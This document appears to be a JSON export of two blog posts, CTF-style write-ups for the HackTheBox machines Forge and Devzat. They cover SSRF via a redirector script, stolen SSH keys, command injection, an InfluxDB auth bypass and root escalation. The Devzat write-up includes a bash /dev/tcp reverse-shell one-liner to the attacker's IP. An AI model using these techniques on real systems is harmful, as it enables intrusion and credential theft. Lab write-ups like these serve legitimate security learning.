[{"content":"Introduction This was a very interesting box to crack. Initial enumeration shows two websites, http://admin.forge.htb and http://forge.htb are available. The admin page is only accessable via localhost, and the other site just lets you upload images. We are able to use ssrf techniques on the url image upload option to view the admin page. The admin page then reveals credentials for the ftp service and how to access it. From there, we can grab the ftp users ssh key from the ftp share and ssh into the machine. The ftp user is allowed to run a script as sudo that opens a pdb instance on an exception. We can force it to crash and then run python code in the pdb shell to get a root shell.\nEnumeration Nmap # Nmap 7.92 scan initiated Wed Jul 27 18:34:26 2022 as: nmap -sS -sCV -oA scans/nmap/init 10.10.11.111 Nmap scan report for 10.10.11.111 Host is up (0.025s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Did not follow redirect to http://forge.htb |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 27 18:34:35 2022 -- 1 IP address (1 host up) scanned in 9.23 seconds Websites Nmap shows that port 80 redirects to http://forge.htb, so we add it to /etc/hosts and run gobuster vhost to see if there are any subdomains\ntrent@kali[Forge]$ gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://forge.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/07/27 18:49:01 Starting gobuster in VHOST enumeration mode =============================================================== Found: admin.forge.htb (Status: 200) [Size: 27] =============================================================== 2022/07/27 18:49:25 Finished =============================================================== We find an admin subdomain and add that to /etc/hosts as well\ntrent@kali[Forge]$ cat /etc/hosts ... 10.10.11.111 forge.htb admin.forge.htb ... Admin subdomain The admin page is only viewable on localhost, so this is currently a dead end\nImage Gallery http://forge.htb looks to be a website to upload and display images. Of note, it allows uploading images from a user supplied url.\nListening for the response in netcat shows that the request was made with python requests, so this is likely a small python web application.\nAfter uploading a file, it generates a link that the image can be viewed at. There does not seem to be a filetype restriction, but the generated link will try to render the page with application type image/jpg.\nTrying to put in anything other then an http/https url fails, and it does not allow requests to itself via localhost or the domain. SSRF We can get around the address blacklist by redirecting the initial request back to our intended address. we can do this with a python script that listens for requests from the server and sends back a redirect.\n#!/usr/bin/env python3 # https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#bypass-via-redirect # python3 ./redirector.py 8000 http://127.0.0.1/ import sys from http.server import HTTPServer, BaseHTTPRequestHandler if len(sys.argv)-1 != 2: print(\u0026#34;Usage: {} \u0026lt;port_number\u0026gt; \u0026lt;url\u0026gt;\u0026#34;.format(sys.argv[0])) sys.exit() class Redirect(BaseHTTPRequestHandler): def do_GET(self): self.send_response(302) self.send_header(\u0026#39;Location\u0026#39;, sys.argv[2]) self.end_headers() HTTPServer((\u0026#34;\u0026#34;, int(sys.argv[1])), Redirect).serve_forever() When we send the redirect request, we can give it blacklisted urls and they will be accepted. Navigating to the generated link in the browser will warn us that the image is corrupt, but we can still see the contents of the request in Burpsuite\nShell as user On http://admin.forge.htb/announcements, we can find the credentials for an ftp user. It also mentions that the admin /upload page accepts ftp/ftps requests and how to make the request.\nWe can use the same redirect script we did before, and have it redirect to http://admin.forge.htb/upload, and try to upload the contents of the ftp share.\n","permalink":"https://TMDeal.github.io/htb/forge/","summary":"Writeup for the Forge lab machine from HackTheBox","title":"HackTheBox - Forge"},{"content":"Introduction Devzat is a box on HackTheBox that involves heavily exploiting a user created chat app. The chat app does not seem to be usable for initial exploitation. However, after initial access, the app becomes a great source of system enumeration from the chat logs, as well as being able to be used to privesc to root. The initial access is gained from a subdomain hosting an incomplete CRUD app for managing an inventory of pets that has the .git directory publicly available. With access to the git folder, we can get the source for the web app and discover a command injection vulnerability that can be exploited with Burpsuite. Initial access as Patrick allows us to read his chat logs, revealing an Influxdb instance is running that is vulnerable to an authentication bypass. The database contains credentials for another user, Catherine, who we are then able to login as. Catherine\u0026rsquo;s chat log reveals there is a development version of the chat app running on port 8443, and there is a backup file on the system. Analysis of the backed up files shows we can use app on port 8443 to read files as root. We can then read roots ssh key to login as root.\nEnumeration Nmap From the nmap results, we can see that this is a webserver with an unidentified app on port 8000. Based on the scan on port 8000, it seems to be using a go library called ssh2go\nNmap scan report for devzat.htb (10.10.11.118) Host is up (0.022s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) | 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-title: devzat - where the devs at |_http-server-header: Apache/2.4.41 (Ubuntu) 8000/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-Go | ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.92%I=7%D=7/5%Time=62C472E7%P=x86_64-pc-linux-gnu%r(NUL SF:L,C,\u0026#34;SSH-2\\.0-Go\\r\\n\u0026#34;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=7/5%OT=22%CT=1%CU=34441%PV=Y%DS=2%DC=T%G=Y%TM=62C47312 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11 OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1720/tcp) HOP RTT ADDRESS 1 21.19 ms 10.10.14.1 2 21.28 ms devzat.htb (10.10.11.118) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Website - http://devzat.htb Initial scanning shows the box has a website up. Trying to navigate to the website redirects us to http://devzat.htb. After updating our /etc/hosts, we are able to see the webpage.\ntrent@TMDeal-kali[Devzat]$ cat /etc/hosts ... 10.10.14.1 devzat.htb ... Not much about the site itself is interesting. However, there is a message at the bottom informing the reader that they are invited to try out their chat app.\nWhen running the instructed command, you may receive an error about no matching host key type. This error can be resolved by adding a few lines to ~/.ssh/config\nHost devzat.htb HostName devzat.htb User dev PubkeyAcceptedAlgorithms +ssh-rsa HostkeyAlgorithms +ssh-rsa Chat App First Look With just the basic level of access we have, there is not much that can be done with the app right now. We will come back to this at a later point\nSubdomin - http://pets.devzat.htb Taking a look back at port 80, since we needed to add an entry to /etc/hosts, it may be worthwhile to scan for subdomains. We will scan for subdomains using Gobuster.\nOur scan finds one valid subdomain at http://pets.devzat.htb The homepage is an incomplete CRUD app.\nThe most that can be done is adding a pet to the pet inventory, but its not hooked up to a database so nothing saves. Running Gobuster to find other endpoints shows that http://pets.devzat.htb/.git/ is publicly readable. We can grab the contents of the folder with git-dumper\ntrent@TMDeal-kali[Devzat]$ git-dumper http://pets.devzat.htb/.git pets ... ... ... trent@TMDeal-kali[Devzat]$ ls -al pets/ total 9776 drwxr-xr-x 5 trent trent 4096 Jul 26 17:44 . drwxrwxrwt 28 root root 12288 Jul 26 17:44 .. drwxr-xr-x 2 trent trent 4096 Jul 26 17:44 characteristics drwxr-xr-x 7 trent trent 4096 Jul 26 17:44 .git -rw-r--r-- 1 trent trent 25 Jul 26 17:44 .gitignore -rw-r--r-- 1 trent trent 88 Jul 26 17:44 go.mod -rw-r--r-- 1 trent trent 163 Jul 26 17:44 go.sum -rw-r--r-- 1 trent trent 4420 Jul 26 17:44 main.go -rwxr-xr-x 1 trent trent 9957033 Jul 26 17:44 petshop -rwxr-xr-x 1 trent trent 123 Jul 26 17:44 start.sh drwxr-xr-x 4 trent trent 4096 Jul 26 17:44 static This is probably the source code for the pets web application. Inside of main.go, there is code that takes our input without sanitizing it and passes it to exec.Command. This means we can inject our own commands into this command and gain remote code execution\nShell as Patrick To test if we can properly execute code, we will just see if we can get the contents of /etc/passwd\nNow that we now we can actually exploit this, we can execute a callback to a netcat listener.\nWe base64 encrypt the command bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.7/4444 0\u0026gt;\u0026amp;1 and then decrypt and execute it in a one liner. This is done to avoid messing up the payload with special characters like \u0026quot; or '.\nFrom there, we can grab Patrick\u0026rsquo;s ssh key for a better shell experience\nShell as Catherine Interesting Ports After running linpeas, we can see that there are some ports that are open locally that we could not previously access\nRight now, we do not know what these ports do, so we will look around some more.\nPatrick Chat Log We can see Patrick\u0026rsquo;s chat log in the chat app by logging into it while logged into the machine as Patrick\nLooking up info on Influxdb shows that it runs on port 8086 by default, and is thus likely what we saw earlier in linpeas. We can check the version of Influxdb running by making a HEAD request with curl on port 8086\nLooking up \u0026ldquo;Influxdb 1.7.5\u0026rdquo; on google shows results for CVE-2019-20933\nWith this exploit, we can bypass authentication and gain access to the database as an admin. We need to port forward with ssh in order to access the database on our machine.\nssh -L 8086:127.0.0.1:8086 patrick@10.10.11.118 -i patrick_id_rsa.\nFrom there, we can dump the data from the users table\nThis reveals a few users and their passwords, but Catherine sticks out because that is a user on the box. Attempting to use this password to switch users to Catherine is successful\nShell as Root Now that we are Catherine, lets examine her chat log like we did for Patrick.\nThe chat log mentions the development version of the chat app is up on port 8443, and the source code is in a backup file. Checking in /var/backup we find archives of the development and main version.\nExtracting and checking the this version of the code shows a new command file has been added that allows reading files on the system. A password is required, but it is hardcoded into the app, so we can just read it. Since this program is running as root, we can read roots ssh key\nThen we can just ssh as root\n","permalink":"https://TMDeal.github.io/htb/devzat/","summary":"Writeup for the Devzat lab machine on HackTheBox","title":"HackTheBox - Devzat"}]